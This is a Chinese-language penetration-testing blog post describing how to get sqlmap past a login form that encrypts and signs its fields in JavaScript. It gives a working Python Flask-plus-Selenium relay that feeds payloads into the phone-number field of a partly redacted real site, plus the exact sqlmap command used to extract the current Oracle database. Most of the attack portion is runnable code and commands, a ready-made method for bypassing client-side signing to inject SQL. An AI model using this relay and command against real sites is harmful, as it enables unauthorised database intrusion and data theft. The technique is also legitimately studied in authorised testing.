+++
title = "通过 selenium 和 flask 中转后利用 sqlmap 进行注入"
topics = [""]
tags = [""]
description = "渗透测试中有时候前端提交的数据会进行加密之类的操作，有些加密的函数还不好找，其实可以用 selenium 调用 chrome 驱动中转后进行测试。"
date = "2019-07-27T18:15:25+08:00"
draft = false
+++

<!--
 * @Author: reber
 * @Mail: reber0ask@qq.com
 * @Date: 2019-07-27 18:15:25
 * @LastEditTime: 2019-07-27 22:53:59
 -->
### 0x00 先说前提
昨天某个小伙伴说有个注入没法搞
![60](/img/post/Xnip2019-07-27_19-20-07.png)

前端提交登陆表单时数据包加密了，而且有个 sign 字符串每次都不一样用于校验，应该是用 js 加密了
![](/img/post/Xnip2019-07-27_18-40-20.png)
![](/img/post/Xnip2019-07-27_18-41-18.png)

### 0x01 找加密的 js 文件
注入的地方是获取验证码时的手机号，刚开始想着先找到 js 加密的函数，然后生成 sign 再组数据包发送。

就像 [记一次SQL Server报错注入](http://localhost:1313/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/) 中一样，用 selenium 或者 PhantomJS 执行 js 代码生成sign

一番查找发现了加密的 js 文件函数，但是用的是 angular 这个前端框架，没用过这个东西。。。。。
![80](/img/post/Xnip2019-07-27_19-06-48.png)
![80](/img/post/Xnip2019-07-27_19-12-37.png)

能看懂一般的 js 代码，但是这个没得搞，不懂。。。

### 0x02 数据中转
本来昨天我已经放弃了的，结果今天上午小伙伴又找我了，说还没有整好，又看了一通 js，仍然无解，看不懂。。。

想起来昨天有个大佬说过可以中转数据，用 PhantomJS + flask 这样、那样、再这样，然后就可以用 sqlmap 跑了😳

<div style="display: flex;align-items: center;justify-content: center;">
    <img src="/img/post/Xnip2019-07-27_20-01-02.png" style="width: 50%;height: 50%;" />
</div><br>

虽然很早以前用过 asp 的 [Cookie 注入中转](http://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/?_blank) ，但是那个是软件，一直没有搞懂原理，现在正好趁机学下

经过各种百度，大概明白了，应是本地起个 server，sqlmap 就扫描这个 server，server 接收到 payload 后将 payload 加到表单中，然后模拟提交表单

### 0x03 selenium 和 flask 进行中转
没有接触过 PhantomJS，但是 selenium 以前用过，可以尝试下

大概看了下，我们需要注意动态的消息提示框，需要处理 input 的长度
![90](/img/post/Xnip2019-07-27_20-25-39.png)

大概代码就是这样了👇

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
'''
@Author: reber
@Mail: reber0ask@qq.com
@Date: 2019-03-22 16:22:59
@LastEditTime: 2019-07-22 09:17:05
'''

import time
from lxml import etree
from flask import Flask
from flask import request
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# chrome_options = Options()
# chrome_options.add_argument('--headless')
# chrome = webdriver.Chrome(executable_path="/opt/chromedriver", options=chrome_options)
chrome = webdriver.Chrome(executable_path="/opt/chromedriver")
chrome.get("https://cx.xxxxxxx.cn/#dashboard")


app = Flask(__name__)

def send(payload):
    # 用两种登陆方式，这里切换到验证码登陆方式
    chrome.find_element_by_link_text("手机登录").click()

    # 手机号长度有限制，去除 input 的 maxlength 属性
    chrome.execute_script("document.getElementById('modile').removeAttribute('maxlength')")

    # 给 input 标签赋值
    chrome.find_element_by_id("modile").send_keys(payload)

    # 点击发送验证码
    chrome.find_element_by_id("BtnphoneNote").click()

    # 网速不好时服务器返回数据慢所以用 while
    while True:
        selector = etree.HTML(chrome.page_source)
        message = selector.xpath("//div[@class='ng-binding ng-scope']/text()")
        if message:
            time.sleep(0.5)
            # 得到返回的信息后，关闭信息提示框，然后清楚 input 的内容便于发送下一个 payload
            chrome.find_element_by_class_name("close").click()
            chrome.find_element_by_id("modile").clear()
            break
        time.sleep(0.5)
    return "ttttt"+message[0]

@app.route('/')
def index():
    payload = request.args.get("payload")
    return send(payload)


if __name__ == "__main__":
    app.run()
```

### 0x04 sqlmap 测试效果
* 启动 flask 服务

```
[16:09 reber@wyb at ~/Pentest]
➜  python3 tmp.py
* Serving Flask app "tmp" (lazy loading)
* Environment: production
WARNING: Do not use the development server in a production environment.
Use a production WSGI server instead.
* Debug mode: off
* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
```

* 使用 sqlmap 尝试扫描

```
sqlmap --risk 2 --level 3 --tamper space2comment --batch --random-agent -u "http://127.0.0.1:5000/?payload=13188888888*" --dbms="Oracle" --technique=E --current-db
```

* flask 接收到了payload

![](/img/post/Xnip2019-07-27_20-42-19.png)

* sqlmap 执行结果

![](/img/post/Xnip2019-07-27_20-40-16.png)


<br>
#### Reference(侵删)：
* [sqlmap 代理绕过参数 hash 验证](https://www.0dayhack.com/post-677.html?_blank)